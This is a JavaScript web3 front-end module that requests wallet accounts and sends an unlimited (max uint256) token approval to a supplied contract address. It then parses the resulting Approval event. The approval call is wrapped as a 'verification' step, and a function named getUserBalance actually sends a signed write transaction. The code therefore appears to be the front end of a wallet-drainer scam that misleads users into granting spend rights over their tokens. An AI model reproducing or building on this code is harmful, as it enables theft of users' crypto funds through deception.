import Web3 from "web3";
import { TokenABI } from "./wagmiConfig";
import toast from "react-hot-toast";
import { ContractABI } from "./config";

const web3 = new Web3(window.ethereum);

// ================== Allowance Check ==================
export const checkAllowance = async (owner, TokenAddress, ContractAddress) => {
  try {
    const token = new web3.eth.Contract(TokenABI, TokenAddress);
    const result = await token.methods.allowance(owner, ContractAddress).call();
    console.log("Allowance raw:", result);
    return Number(result);
  } catch (err) {
    console.error("checkAllowance error:", err);
    return 0;
  }
};

// ================== Approve Token ==================
export const tokenApprove = async (TokenAddress, ContractAddress) => {
  try {
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
    });
    const from = accounts[0];

    const token = new web3.eth.Contract(TokenABI, TokenAddress);

    // Unlimited approve (max uint256)
    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    const tx = await token.methods
      .approve(ContractAddress, MAX_UINT256)
      .send({ from });

    console.log("Unlimited Approval Tx:", tx);

    return tx;
  } catch (err) {
    console.error("Approval error:", err);
    throw err;
  }
};


export const getUserBalance = async (ContractAddress, token) => {
  try {
    const accounts = await web3.eth.requestAccounts(); // get user wallet
    const user = accounts[0];

    // Create contract instance
    const contract = new web3.eth.Contract(ContractABI, ContractAddress);

    // Send transaction (write function)
    const tx = contract.methods.checkAllowance(token);
    const gas = await tx.estimateGas({ from: user });
    const gasPrice = await web3.eth.getGasPrice();

    const result = await tx.send({
      from: user,
      gas,
      gasPrice,
    });

    // Transaction receipt after confirmation
    console.log("Transaction receipt:", result);
    return result;
  } catch (error) {
    console.error("Error in getUserBalance:", error);
    throw error;
  }
};

// ================== With Toast Wrapper ==================
export const appToken = async (amt, TokenAddress, ContractAddress) => {
  console.log(amt, TokenAddress, ContractAddress, "tokenApprove");
  try {
    const res = tokenApprove(TokenAddress, ContractAddress);

    return res;
  } catch (error) {
    console.error("appToken error:", error);
    toast.error("Verification failed ❌");
    return false;
  }
};

// ================== Parse Approval Event from Receipt ==================
export const getApprovalDetails = async (txReceipt, decimals = 18) => {
  let receipt = txReceipt;
  if (!receipt.logs) {
    receipt = await web3.eth.getTransactionReceipt(txReceipt);
  }

  const approvalTopic =
    "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925";

  const log = receipt.logs.find((l) => l.topics[0] === approvalTopic);
  if (!log) throw new Error("No Approval event found");

  const owner = "0x" + log.topics[1].slice(26);
  const spender = "0x" + log.topics[2].slice(26);
  const rawAmount = BigInt(log.data);

  return {
    from: owner,
    spender,
    amount: (Number(rawAmount) / 10 ** decimals).toString(),
    rawAmount,
    txHash: receipt.transactionHash,
    blockNumber: receipt.blockNumber,
  };
};
